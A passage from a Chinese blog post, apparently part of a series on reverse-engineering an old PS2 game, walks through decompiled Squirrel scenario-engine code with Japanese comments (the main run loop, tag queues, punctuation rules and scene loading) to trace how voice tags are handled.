class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * メインロジック</span><br><span class="line"> */</span><br><span class="line">function run()    &#123;</span><br><span class="line">    local obj;</span><br><span class="line">    for(;;)    &#123;</span><br><span class="line"></span><br><span class="line">        // ロード復帰処理</span><br><span class="line">        if (targetPage != null) &#123;</span><br><span class="line">            // ...</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (pendings.len() &gt; 0) &#123;</span><br><span class="line">            // 後回しにされたタグがある場合</span><br><span class="line">            obj = pendings[0];</span><br><span class="line">            pendings.remove(0);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            // 表示テキストがある場合の処理</span><br><span class="line">            if (currentText.len() &gt; 0) &#123;</span><br><span class="line">//                    if (isSkip()) &#123;</span><br><span class="line">//                        obj = &#123;tagname=&quot;ch2&quot;, text=currentText&#125;;</span><br><span class="line">//                        currentText = &quot;&quot;;</span><br><span class="line">//                    &#125; else &#123;</span><br><span class="line">                    if (iskanji(currentText)) &#123;</span><br><span class="line">                        local ch = currentText.slice(0,2);</span><br><span class="line">                        currentText = currentText.slice(2);</span><br><span class="line">                        obj = &#123;tagname=&quot;ch2&quot;, text=ch&#125;;</span><br><span class="line">                    &#125; else &#123;</span><br><span class="line">                        local ch = currentText.slice(0,1);</span><br><span class="line">                        currentText = currentText.slice(1);</span><br><span class="line">                        obj = &#123;tagname=&quot;ch2&quot;, text=ch&#125;;</span><br><span class="line">                    &#125;</span><br><span class="line">//                    &#125;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                if (cur &lt; lines.len()) &#123;</span><br><span class="line">                    obj = lines[cur++];</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    obj = null;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if (obj == null) &#123;</span><br><span class="line">            // シナリオ終了</span><br><span class="line">            //dm(&quot; シナリオ終了 cur:&quot; + curStorage + &quot; next:&quot; + nextStorage) ;</span><br><span class="line">            local next = nextStorage;</span><br><span class="line">            if (next == null || next == 0) &#123;</span><br><span class="line">                next = getNextScene(curStorage);</span><br><span class="line">            &#125;                    </span><br><span class="line">            dm(&quot;next:&quot; + next);</span><br><span class="line">            if (next != null &amp;&amp; next != &quot;&quot; &amp;&amp; next != 0) &#123;</span><br><span class="line">                goToNext(next);</span><br><span class="line">                continue;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                status = STOP;</span><br><span class="line">                return;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else if (obj.tagname == &quot;label&quot;) &#123; // ラベル処理</span><br><span class="line">            if (targetPage != null) &#123;</span><br><span class="line">                if (targetBranches.len() &gt; 0) &#123;</span><br><span class="line">                    if (obj.count != targetBranches[0]) &#123;</span><br><span class="line">                        goToCount(targetBranches[0]);</span><br><span class="line">                        continue;</span><br><span class="line">                    &#125; else &#123;</span><br><span class="line">                        targetBranches.remove(0);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    // XXX ロード失敗</span><br><span class="line">                    dm(&quot; ロード失敗: ラベルの整合不良 &quot;);</span><br><span class="line">                    status = STOP;</span><br><span class="line">                    return;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            setReaded(curPage);    // 次のラベルに進む前に最後の行の既読をたてる</span><br><span class="line">            curCount = obj.count;</span><br><span class="line">            branches.append(curCount);</span><br><span class="line">            curPage = 0;</span><br><span class="line">            savePrepare();</span><br><span class="line">            continue;</span><br><span class="line">        &#125; else if (obj.tagname == &quot;begintrans&quot;) &#123;</span><br><span class="line">            //dm(&quot; 全体トランジションを処理 &quot;);</span><br><span class="line">            obj = null;</span><br><span class="line">            while (cur &lt; lines.len() &amp;&amp; (obj = lines[cur++]) != null &amp;&amp; obj.tagname != &quot;endtrans&quot;) &#123;</span><br><span class="line">                if (obj.tagname == &quot;begintrans&quot;) &#123;</span><br><span class="line">                    throw &quot;begintrans は入れ子にできません &quot;;</span><br><span class="line">                &#125;</span><br><span class="line">                pendings.append(obj);</span><br><span class="line">            &#125;</span><br><span class="line">            if (obj == null) &#123;</span><br><span class="line">                throw &quot;begintrans に対応する endtrans がありません &quot;;</span><br><span class="line">            &#125;</span><br><span class="line">            if (!isJump()) &#123;</span><br><span class="line">                local trans = null;</span><br><span class="line">                foreach (cmd, param in obj) &#123;</span><br><span class="line">                    if (cmd == &quot;tagname&quot;) &#123;</span><br><span class="line">                        // ignore</span><br><span class="line">                    &#125; else if (cmd == &quot;trans&quot;) &#123;</span><br><span class="line">                        local tr = getTrans(param, obj);</span><br><span class="line">                        if (tr != null) &#123;</span><br><span class="line">                            trans = tr;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; else if (cmd == &quot;fade&quot;) &#123;</span><br><span class="line">                        local time = param.tointeger();</span><br><span class="line">                        trans = &#123;</span><br><span class="line">                            method = &quot;crossfade&quot;,</span><br><span class="line">                            time = time &gt; 1 ? time : env.getFadeValue(),</span><br><span class="line">                        &#125;;</span><br><span class="line">                    &#125; else &#123;</span><br><span class="line">                        local tr = getTrans(cmd, obj);</span><br><span class="line">                        if (tr != null) &#123;</span><br><span class="line">                            trans = tr;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                if (trans != null &amp;&amp; &quot;msgoff&quot; in trans) &#123;</span><br><span class="line">                    insertTag(&quot;msgoff&quot;, null);</span><br><span class="line">                &#125;</span><br><span class="line">                if (trans != null &amp;&amp; getval(trans, &quot;method&quot;) == &quot;layer&quot;) &#123;</span><br><span class="line">                    insertTag(&quot;_beginlt&quot;, trans);</span><br><span class="line">                    local e = &#123;&#125;;</span><br><span class="line">                    if (&quot;transwait&quot; in trans) &#123;</span><br><span class="line">                        e.wait &lt;- getint(trans, &quot;transwait&quot;);</span><br><span class="line">                    &#125;</span><br><span class="line">                    if (&quot;endtime&quot; in trans) &#123;</span><br><span class="line">                        e.time &lt;- getint(trans, &quot;endtime&quot;);</span><br><span class="line">                    &#125;</span><br><span class="line">                    if (&quot;endtype&quot; in trans) &#123;</span><br><span class="line">                        e.type &lt;- getval(trans, &quot;endtype&quot;);</span><br><span class="line">                    &#125;</span><br><span class="line">                    if (&quot;endrule&quot; in trans) &#123;</span><br><span class="line">                        e.rule &lt;- getval(trans, &quot;endrule&quot;);</span><br><span class="line">                    &#125;</span><br><span class="line">                    addTag(&quot;_endlt&quot;, e);</span><br><span class="line">                &#125; else if (trans != null) &#123;</span><br><span class="line">                    insertTag(&quot;_begintrans&quot;, null);</span><br><span class="line">                    addTag(&quot;_endtrans&quot;, &#123;trans=trans&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            continue;</span><br><span class="line">        &#125; else if (obj.tagname == &quot;ch&quot;) &#123;</span><br><span class="line">            doText(obj.text);</span><br><span class="line">            continue;</span><br><span class="line">        &#125; else if (obj.tagname == &quot;embex&quot;) &#123; // 変数埋め込みの参照</span><br><span class="line">            if (&quot;exp&quot; in obj) &#123;</span><br><span class="line">                local text = ::eval(obj.exp);</span><br><span class="line">                if (typeof text == &quot;string&quot;) &#123;</span><br><span class="line">                    doText(text);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            continue;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            // その他のコマンド</span><br><span class="line">            </span><br><span class="line">            // 実行時判定される cond</span><br><span class="line">            if (&quot;condex&quot; in obj) &#123;</span><br><span class="line">                if (!::eval(obj.condex)) &#123;</span><br><span class="line">                    continue;</span><br><span class="line">                &#125;</span><br><span class="line">                //delete obj.condex;</span><br><span class="line">            &#125; else if (&quot;if&quot; in obj) &#123;</span><br><span class="line">                if (!::eval(obj[&quot;if&quot;])) &#123;</span><br><span class="line">                    continue;</span><br><span class="line">                &#125;</span><br><span class="line">                //delete obj[&quot;if&quot;];</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            // onTag を呼ぶ</span><br><span class="line">            local step = onTag(obj);</span><br><span class="line">            if (step == null) &#123;</span><br><span class="line">                throw &quot;onTag が null を返しました (&quot; + obj.tagname + &quot;)&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">            step = step.tointeger(); // step を数値に</span><br><span class="line">            //dm(obj.tagname + &quot; タグ戻り値:&quot; + step);</span><br><span class="line">            </span><br><span class="line">            if (step == 0) &#123;</span><br><span class="line">                continue;</span><br><span class="line">            &#125;</span><br><span class="line">            if (step &lt; 0) &#123;</span><br><span class="line">                switch(step) &#123;</span><br><span class="line">                case -5: // いったんイベントを処理(現在のタグは後回し)</span><br><span class="line">                    pendings.insert(0, obj);</span><br><span class="line">                    return;</span><br><span class="line">                case -4: // いったんイベントを処理</span><br><span class="line">                    return;</span><br><span class="line">                case -3: // 後回ししてブレーク</span><br><span class="line">                    pendings.insert(0, obj);</span><br><span class="line">                    updateBeforeCh = 1;</span><br><span class="line">                    return;</span><br><span class="line">                case -2: // ブレーク</span><br><span class="line">                    updateBeforeCh = 1;</span><br><span class="line">                    return;</span><br><span class="line">                case -1: // シナリオ終了</span><br><span class="line">                    status = STOP;</span><br><span class="line">                    return;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                waitTime(step, false);</span><br><span class="line">                return;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数是一个巨大的无限循环 <code>for(;;)</code>，但是看起来循环存在多种退出逻辑，因此不一定是游戏主循环，根据类以及函数注释，该函数很有可能是一个场景下的的主要处理逻辑。</p><p>分析一下这个函数的逻辑，主要从 <code>onTag</code> 那一行开始看起，<code>onTag</code> 的参数 <code>elm</code> 也就是该函数中的 <code>obj</code>，在调用 <code>onTag</code> 前都是在生成 <code>obj</code>，之后调用 <code>onTag</code> 处理 <code>obj</code>，之后返回一个 <code>step</code> 来决定循环是否继续或者直接退出。</p><p>在大循环中，首先判断了一下 <code>targetPage</code>，根据游戏经验以及注释，这个 if 分支可能是快速推进剧本到 <code>targetPage</code>，也就是实现快进功能。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">// ロード復帰処理</span><br><span class="line">if (targetPage != null) &#123;</span><br><span class="line">    if (targetBranches.len() == 0 &amp;&amp; curPage &gt;= targetPage) &#123;</span><br><span class="line">        dm(&quot; ジャンプ終了 &quot;);</span><br><span class="line">        savePrepare();</span><br><span class="line">        showVariables(variables, VAR_GAME);</span><br><span class="line">        targetPage = null;</span><br><span class="line">        // 画面復帰処理</span><br><span class="line">        insertTag(&quot;_endlt&quot;, &#123;time=1000&#125;);</span><br><span class="line">        insertTag(&quot;_sync&quot;, null);</span><br><span class="line">        // すぐマスク</span><br><span class="line">        beginLayerTrans(&#123;time=0&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后就是 <code>obj</code> 的生成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">if (pendings.len() &gt; 0) &#123;</span><br><span class="line">    // 後回しにされたタグがある場合</span><br><span class="line">    obj = pendings[0];</span><br><span class="line">    pendings.remove(0);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    // 表示テキストがある場合の処理</span><br><span class="line">    if (currentText.len() &gt; 0) &#123;</span><br><span class="line">//        if (isSkip()) &#123;</span><br><span class="line">//            obj = &#123;tagname=&quot;ch2&quot;, text=currentText&#125;;</span><br><span class="line">//            currentText = &quot;&quot;;</span><br><span class="line">//        &#125; else &#123;</span><br><span class="line">            if (iskanji(currentText)) &#123;</span><br><span class="line">                local ch = currentText.slice(0,2);</span><br><span class="line">                currentText = currentText.slice(2);</span><br><span class="line">                obj = &#123;tagname=&quot;ch2&quot;, text=ch&#125;;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                local ch = currentText.slice(0,1);</span><br><span class="line">                currentText = currentText.slice(1);</span><br><span class="line">                obj = &#123;tagname=&quot;ch2&quot;, text=ch&#125;;</span><br><span class="line">            &#125;</span><br><span class="line">//        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        if (cur &lt; lines.len()) &#123;</span><br><span class="line">            obj = lines[cur++];</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            obj = null;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果 <code>pendings</code> 队列非空则直接获取队首，否则生成新的，这里我们先关注生成。首先判断了 <code>currentText</code> 是否有值，根据变量名猜测这个可能就是当前要播放的文字，注释说该 if 分支表示“有显示文本时的处理”，在游戏大部分时候肯定都是有文字显示，那么进入该分支的频率可能会非常高。</p><p>如果 <code>currentText</code> 有值，则先判断 <code>iskanji</code>，日语中 kanji 是汉字的意思，实际上这里就是判断是否需要采用双字节编码。不管是否属于汉字，都将 <code>currentText</code> 的第一个字符切下来保存在 <code>obj.text</code> 中，<code>currentText</code> 保存剩下的，而此时 <code>tagname</code> 为 <code>ch2</code>也就是回调函数 <code>tag_ch</code>，很明显这不是我们想要的回调函数。如果 <code>currentText</code> 没有值，那么 <code>obj</code> 就可能会在 else 分支中来自 <code>lines</code> 数组，或者为 <code>null</code>。</p><p>看一下 <code>iskanji</code> 函数发现其实这里是将前一个句子结尾的标点符号截取出来，因此这里 <code>obj</code> 仅是为了处理一个标点字符而生成。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">// 行頭禁則</span><br><span class="line">kinsokuText &lt;- &#123;</span><br><span class="line">    [&quot;。&quot;] = true,</span><br><span class="line">    [&quot;，&quot;] = true,</span><br><span class="line">    [&quot;、&quot;] = true,</span><br><span class="line">    [&quot;．&quot;] = true,</span><br><span class="line">    [&quot;：&quot;] = true,</span><br><span class="line">    [&quot;；&quot;] = true,</span><br><span class="line">    [&quot; ゛ &quot;] = true,</span><br><span class="line">    [&quot; ゜ &quot;] = true,</span><br><span class="line">    [&quot; ヽ &quot;] = true,</span><br><span class="line">    [&quot; ヾ &quot;] = true,</span><br><span class="line">    [&quot; ゝ &quot;] = true,</span><br><span class="line">    [&quot; ゞ &quot;] = true,</span><br><span class="line">    [&quot;々&quot;] = true,</span><br><span class="line">    [&quot;’&quot;] = true,</span><br><span class="line">    [&quot;”&quot;] = true,</span><br><span class="line">    [&quot;）&quot;] = true,</span><br><span class="line">    [&quot;〕&quot;] = true,</span><br><span class="line">    [&quot;］&quot;] = true,</span><br><span class="line">    [&quot;｝&quot;] = true,</span><br><span class="line">    [&quot;〉&quot;] = true,</span><br><span class="line">    [&quot;》&quot;] = true,</span><br><span class="line">    [&quot;」&quot;] = true,</span><br><span class="line">    [&quot;』&quot;] = true,</span><br><span class="line">    [&quot;】&quot;] = true,</span><br><span class="line">    [&quot;°&quot;] = true,</span><br><span class="line">    [&quot;′&quot;] = true,</span><br><span class="line">    [&quot;″&quot;] = true,</span><br><span class="line">    [&quot;℃&quot;] = true,</span><br><span class="line">    [&quot;￠&quot;] = true,</span><br><span class="line">    [&quot;％&quot;] = true,</span><br><span class="line">    [&quot;‰&quot;] = true,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">function isKinsoku(ch)</span><br><span class="line">&#123;</span><br><span class="line">    return ch in kinsokuText;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着往下看 <code>obj</code> 为 <code>null</code> 会被如何处理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">if (obj == null) &#123;</span><br><span class="line">    // シナリオ終了</span><br><span class="line">    //dm(&quot; シナリオ終了 cur:&quot; + curStorage + &quot; next:&quot; + nextStorage) ;</span><br><span class="line">    local next = nextStorage;</span><br><span class="line">    if (next == null || next == 0) &#123;</span><br><span class="line">        next = getNextScene(curStorage);</span><br><span class="line">    &#125;                    </span><br><span class="line">    dm(&quot;next:&quot; + next);</span><br><span class="line">    if (next != null &amp;&amp; next != &quot;&quot; &amp;&amp; next != 0) &#123;</span><br><span class="line">        goToNext(next);</span><br><span class="line">        continue;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        status = STOP;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据注释，如果 <code>obj</code> 为 <code>null</code>，那么代表剧本结束，进入下一个场景，因此当需要播放声音时，<code>obj</code> 不应该为 <code>null</code>。在往下看 obj 如何被处理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">if (obj.tagname == &quot;label&quot;) &#123; // ラベル処理</span><br><span class="line">    // ...</span><br><span class="line">&#125; else if (obj.tagname == &quot;begintrans&quot;) &#123;</span><br><span class="line">    // ...</span><br><span class="line">&#125; else if (obj.tagname == &quot;ch&quot;) &#123;</span><br><span class="line">    doText(obj.text);</span><br><span class="line">    continue;</span><br><span class="line">&#125; else if (obj.tagname == &quot;embex&quot;) &#123; // 変数埋め込みの参照</span><br><span class="line">    if (&quot;exp&quot; in obj) &#123;</span><br><span class="line">        local text = ::eval(obj.exp);</span><br><span class="line">        if (typeof text == &quot;string&quot;) &#123;</span><br><span class="line">            doText(text);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    continue;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    // その他のコマンド</span><br><span class="line">    </span><br><span class="line">    // 実行時判定される cond</span><br><span class="line">    if (&quot;condex&quot; in obj) &#123;</span><br><span class="line">        if (!::eval(obj.condex)) &#123;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line">        //delete obj.condex;</span><br><span class="line">    &#125; else if (&quot;if&quot; in obj) &#123;</span><br><span class="line">        if (!::eval(obj[&quot;if&quot;])) &#123;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line">        //delete obj[&quot;if&quot;];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // onTag を呼ぶ</span><br><span class="line">    local step = onTag(obj);</span><br><span class="line">    if (step == null) &#123;</span><br><span class="line">        throw &quot;onTag が null を返しました (&quot; + obj.tagname + &quot;)&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    step = step.tointeger(); // step を数値に</span><br><span class="line">    // ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后在调用 <code>onTag</code> 前并没有生成新的 <code>obj</code>，那么到此为止生成的 <code>obj</code> 只是为了处理 <code>currentText</code> 开头的标点，则其他的 <code>obj</code> 只能来自类的静态变量 <code>pendings</code> 队列或者 <code>lines</code> 数组。首先看看 <code>pendings</code> 从哪里来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * タグ割り込み処理</span><br><span class="line"> */</span><br><span class="line">function addTag(name, elm) &#123;</span><br><span class="line">    local e;</span><br><span class="line">    if (elm != null) &#123;</span><br><span class="line">        e = clone elm;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        e = &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    if (name != null) &#123;</span><br><span class="line">        e.tagname &lt;- name;</span><br><span class="line">    &#125;</span><br><span class="line">    pendings.append(e);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * タグ割り込み処理</span><br><span class="line"> */</span><br><span class="line">function insertTag(name, elm) &#123;</span><br><span class="line">    local e;</span><br><span class="line">    if (elm != null) &#123;</span><br><span class="line">        e = clone elm;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        e = &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    if (name != null) &#123;</span><br><span class="line">        e.tagname &lt;- name;</span><br><span class="line">    &#125;</span><br><span class="line">    pendings.insert(0, e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 <code>run</code> 循环中的 <code>pendings</code> 主要添加的是已有的 <code>obj</code>，因此 <code>pendings</code> 的其他值只能通过函数 <code>addTag</code> 以及 <code>insertTag</code> 添加。这两个函数都会添加一个 <code>elm</code>，也就是 <code>obj</code>，并且将 <code>name</code> 作为 <code>tagname</code>，所以接下来找找哪些地方调用了这些函数。</p><p><img src="/2023/06/12/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%89%EF%BC%89/19.jpg" alt="Not Found"></p><p><img src="/2023/06/12/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%89%EF%BC%89/20.jpg" alt="Not Found"></p><p>很可惜，在所有的搜索结果中，没有找到调用 <code>entryvoice</code> 以及 <code>dispname</code> 的代码，因此 <code>pendings</code> 并不是我们的目标，那么来看看 <code>lines</code>。</p><p><img src="/2023/06/12/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%89%EF%BC%89/21.jpg" alt="Not Found"></p><p><code>lines</code>并没有写值操作，但是有赋值操作 <code>lines = getScene(curStorage)</code>，都是在 <code>28_43000_d330.nut</code> 中.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 実行開始</span><br><span class="line"> * @param storage 開始シナリオ</span><br><span class="line"> * @param option パース用オプション</span><br><span class="line"> */</span><br><span class="line">function start(storage) &#123;</span><br><span class="line">    dm(&quot; シーン再生開始 &quot;);</span><br><span class="line">    clearForStart();</span><br><span class="line">    curStorage = storage;</span><br><span class="line">    lines = getScene(curStorage);</span><br><span class="line">    </span><br><span class="line">    prevSkipMode = null;</span><br><span class="line">    currentText = &quot;&quot;;</span><br><span class="line">    status = RUN;</span><br><span class="line">    // 初期変数保存</span><br><span class="line">    savef = clone f;</span><br><span class="line">    savePrepare();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * ロード処理</span><br><span class="line"> * ゲーム変数からシナリオ状態変数を読み込んでから実行開始</span><br><span class="line"> */</span><br><span class="line">function load() &#123;</span><br><span class="line">    dm(&quot; シーンロード開始 &quot;);</span><br><span class="line">    clearForStart();</span><br><span class="line">    </span><br><span class="line">    if (savef.storage != &quot;&quot;) &#123;</span><br><span class="line">        dm(&quot; ロード対象:&quot; + savef.storage);</span><br><span class="line">        dm(&quot; ロードまでの分岐数:&quot; + savef.branchCount);</span><br><span class="line">        dm(&quot; ロード先:&quot; + savef.targetPage);</span><br><span class="line">        curStorage = savef.storage;</span><br><span class="line">        lines = getScene(curStorage);</span><br><span class="line">        if (lines == null) &#123;</span><br><span class="line">            dm(&quot; ロード失敗 &quot;);</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        // 分岐情報復帰</span><br><span class="line">        for (local i=0;i&lt;savef.branchCount;i++) &#123;</span><br><span class="line">            targetBranches.append(savef[&quot;branch&quot;+i]);</span><br><span class="line">            //dm(&quot; 分岐:&quot; + savef[&quot;branch&quot;+i]);</span><br><span class="line">        &#125;</span><br><span class="line">        // ページ番号復帰</span><br><span class="line">        targetPage = savef.targetPage;</span><br><span class="line">        // 